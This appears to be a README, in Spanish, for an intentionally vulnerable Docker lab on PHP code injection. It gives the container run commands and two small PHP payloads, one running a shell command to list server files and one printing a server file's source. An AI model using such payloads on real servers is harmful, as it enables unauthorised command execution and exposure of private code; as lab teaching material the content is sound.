# Code Injection

Descargar y Montar el servidor desde Docker:

```bash
docker pull ghcr.io/ingenieroricardo/codeinjection:latest
docker run --publish 8080:80 ghcr.io/ingenieroricardo/codeinjection:latest
```

<hr>

Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como esto:

```php
<?php
  $salida = shell_exec("cd .. && ls");
  echo "<pre>$salida</pre>";
?>
```
Con este codigo podemos conocer los archivos en el servidor


```php
<?php
  show_source("../archivos.php");
?>
```
Con este codigo podemos ver codigo fuente
